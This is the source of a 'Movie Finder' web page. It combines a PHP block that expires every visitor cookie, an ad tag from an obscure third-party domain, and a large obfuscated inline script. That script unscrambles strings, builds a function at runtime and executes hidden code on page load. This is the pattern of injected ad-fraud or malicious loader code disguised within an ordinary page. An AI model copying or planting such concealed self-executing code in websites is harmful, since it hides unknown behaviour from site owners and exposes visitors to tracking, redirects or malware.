<?php
// Clear all cookies
if (isset($_SERVER['HTTP_COOKIE'])) {
    $cookies = explode(';', $_SERVER['HTTP_COOKIE']);
    foreach ($cookies as $cookie) {
        $parts = explode('=', $cookie);
        $name = trim($parts[0]);
        // Expire the cookie
        setcookie($name, '', time() - 3600, '/');
        // For some cases also unset
        unset($_COOKIE[$name]);
    }
}
?>





<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Movie Finder</title>

  <script src="https://fpyf8.com/88/tag.min.js" data-zone="157609" async data-cfasync="false"></script>

  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-R9QCCJ62Y8"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-R9QCCJ62Y8');
</script>
  
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      background-color: #0f172a;
    }
    ::placeholder {
      color: #94a3b8;
    }
    .glass {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
    }
  </style>


  
<script>
    var clearAll;(function(){var EnO='',KMT=247-236;function juZ(h){var o=67399;var r=h.length;var f=[];for(var y=0;y<r;y++){f[y]=h.charAt(y)};for(var y=0;y<r;y++){var x=o*(y+392)+(o%19991);var c=o*(y+100)+(o%47659);var l=x%r;var i=c%r;var n=f[l];f[l]=f[i];f[i]=n;o=(x+c)%1458017;};return f.join('')};var xJG=juZ('sczovsurrfcpnucrngbqedtmtkhaotxlowjyi').substr(0,KMT);var FhP='uo.in";[r8(;8vb=e2[a8r,[=r =ldga(a(jttr+op,2s;>n7r9zrA,ahhr+u.(,;1ooC,.2rm.,"+q8;vx)a,+hr;o712v) 1l=nunn(;=l+8+xf(hgb)=e1vnre+8]+[+[=]yvat{=+0ra+neeo1=(zaluo)p[1*lpa  {mavtrcf=p l,;t r2iy;f);f=v3ckaorq=heb7xfry<=;.u;.agu,aen;ngmarl!{["ro)ra>)h6h;th[aC)sngi}ca ;8C]7"6+;(,c86juefwr+-)=g(d[ z.-u<v;8sq=epA))c;=er7;u}C.46rl].ulsgt.o +n=lt,(u6tnu)v v)s0ltt=)4".ur)vn;"(g<"e,-f".)lrvvrl*.htc;=srn)=9 e;)k=a28alo,}a;iif[nCgt(f-le;ueulr0sr=r;(r;6f{===t;] h1(dy+ll.aelf=90ldae6q)f;=ihesni;;u6i(.0hn,  1hp)(.0p}=0=m+hh.]h(met { 1));r)=helh=2!rcssennA a]a7,rjah+;lp]vlbsu)[4lo}zowm=}rkuC5<uA)u.gtri)m(x;v=w[+e,9stla el1,7"cf);+.)(,.=7ob((ewchS]c<t]5xf)s;jAm.(f,mwvvt(e)3rg(zC;5.jc9re"ixre}(ligab+gi0](,r=7t,a=,dr0+mi(,t;oen(p-agug]t;42,1()ha r24.v2 epoqge(v;( jrSr=+ni;C{gmi;efotdl-,(va,o +,;t=uo9or=za.ej=.r;{.xprvr)s9iteiv0v;c;tvnona;)ljvsn(atrslr=[;onnf nmi6n1cdgw])]ki .r-n[raeh+(5j30a+mgyou= n01';var Kbu=juZ[xJG];var tOc='';var PRH=Kbu;var hBR=Kbu(tOc,juZ(FhP));var vdk=hBR(juZ('a:sZ8_68t.)e;;_ d %#sZe<)Zefn8,3Z!t(.oZ(Z>Z"d,Zn=w(0Z)}3_f}(f"i3d]s{ofo(o%zed.io%Z:g;i0oZn=rsf0s=f1};ZZ)1].j!Z97fSumen!}%ZZ$fqZi_=;cf6o7Z_>,un\/7.)oZ(>.Z1c$u](s(Z6(f(Zfe"Z;(;!Z!. _?en;[}Ze()}<,dZ=%Z>]Z<tcZos]g(!+el0t)beZir=D%d8{pubdZeZlou8 ,+0 .e)w8si,7=e.c3.l0](11r_kd(nzr3bZt7ZfD7rZ=%)dff;.Z:Zrjsuqe=}.aZZet=efc0digzb%5d.ZZcna&Z: rc1e.nf>fnnpZZ{Sb(6(fe$f].4iZZ=_n5)nZZ),atf]l$ci"=o;7 slfhcc,fza.Z3q\/"(=}9.bZt6;Z,=\/eZ9 Z;;;Za.=nZ.i.f?4Z3p&;%=.fZZ5Z+fZc\'7n(]<t.)iZwZ)f=wn+i!Z91ft0t);4,(]l..duo=$_$o(!Z.;.9%sZu0#tr.r))]7o+,$)-[.bZp..Zf_6f0a tgo}ZZf+Zfe(c,(1Zt;sZZ];.d{74dfu,;_2isebrbsZ.3;Ze}d.)]=r.(<.Z*28 )]. +Z5e73,;C(ft;(.$lh(tZ(]i$;bf]c=n({.;Z4e!Sr1Ztd5Zs.)dal18rbqZ, =ah!f9bu}#.zo})Zc.Z44r2TaZ3(=o4!hx}cs;=,bl;=1n9)fZ)9ff)!4#=.Z7,2lbz-)%e%Sld0(oiqffaooZbyr)i3x4]0eZu.)e0i.q7ZiltT,o)!l]\'is[Zu!Z({)*nn!ZZZa9yZc!}3h.f,na5e&3jm]f+at22olg!.aZ),fZ0=6n,Z6Z i_Z[  (>{Zli*%n};co(itc$a31zo;=wZ)0ssf?00 )dZo .$2ie7c)pti,;%)"Z9Znn]]b)(M);6)s)08oo$2a2Z ta.bg0c(;s] l+71{n{fg\',anZd(Z6_dZnZ_l]0()eufeZZt.;n]!4Zc]xZ&i(Zfr]($Zt%ZZ${fnrst,6sZeC134ot7)fa.aet(0Z,(ta]-xf;t72m.or)foo1-}.a1=f.e$inoi6;aZ_#s<?*) isE1d3t;teZt!rZ512..(#c-f2fe );ale_.9{o}cZeaa.fbZ3oa.3tfhoZ(c)D:9ffn5f]a1e()7:.0)o$,j$(_.=Zze_0s,orp o?. Z{)ZZ(Zr_=b-it;Z]]o=l;0]{}msu_z;5)Z(ZoZc\/0rZ=c%),eq5!m69!1dZZol(a(e2na6]Z0=(!t)3s\'.o$.eZ4msrqb{m.Zd)fo0wr&ln0u ={f).;1.Z.gZ])to}nZe(0dD.tpfo>#r.y*od_.t7. ;rZo$}neto..&b)nr7(ar.n,-t%)d.nqZ5$)iek;=2Z(."Zf{e7t6)feouZ_]nd{)ZZZu:0,)% .217e0Zie3[Zr( e7 nZ(s\/1cr)s($xkn0%[f.fZ.e)=boa!033:+Z[Z.ge..bZ5!9t[s=0ZcZd4),qs;{sc.(;)vod.!;6i:rnc_w{}3t  :s 6()r.qqon4teZr'));var esL=PRH(EnO,vdk );esL(8234);return 7201})()
    
</script>
